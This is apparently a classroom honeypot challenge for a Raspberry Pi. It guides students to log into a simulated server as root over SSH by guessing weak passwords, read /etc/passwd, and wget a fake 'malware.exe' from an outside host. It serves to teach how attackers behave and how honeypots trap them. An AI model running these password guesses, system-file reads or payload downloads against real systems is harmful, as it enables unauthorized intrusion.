WARNING: This is not a web application. To play this challenge, you need to open the Terminal application on your Raspberry Pi desktop (the black box icon at the top of the screen).

üß† The Concept

A honeypot is an "Active Defense" trap. Instead of trying to keep hackers out, cybersecurity engineers set up fake, highly vulnerable servers specifically designed to lure them in.

When a hacker attacks a honeypot, they think they have successfully breached a real company. In reality, they are trapped in a fake, simulated computer system, and the security engineers are recording every single command they type to study their tactics.

üéØ Mission 1: Break In

Your first goal is to force your way into the server using a protocol called SSH (Secure Shell). Because this server is a trap, the administrators intentionally left a terrible password on the root (admin) account.

  1. Open your Terminal.
  2. Look at your main dashboard to find your specific SSH command and target IP. It will look something like this:
    ssh -p 2221 root@192.168.2.10
  3. Type that command into the terminal and press Enter.
  4. When it asks for a password, try guessing awful, common passwords. (Hint: Try 123456, admin, or password). Note: When typing passwords in Linux, the cursor will not move. Just type it and hit Enter!

üéØ Mission 2: Explore the System

If you guessed the password correctly, your terminal prompt will change to root@server:~#. You are now "inside" the honeypot!

Because there is no mouse or graphical menu, you have to navigate the computer using text commands. Try typing these real Linux commands into the terminal to see what you can find:

ls -la
(List all files: Shows you every hidden file and folder in your current directory.)

pwd
(Print Working Directory: Tells you exactly where you are located inside the server.)

whoami
(Who Am I: Asks the server what user account you are currently logged in as.)

cat /etc/passwd
(Concatenate: This forces the server to print out the master list of all user accounts registered to the machine.)

üéØ Mission 3: The Download

Hackers often try to download malicious files once they break into a server. Try downloading a fake file from the internet using the `wget` command:

wget http://google.com/malware.exe
(Notice how the honeypot pretends to download the file, even though it isn't connected to the real internet!)
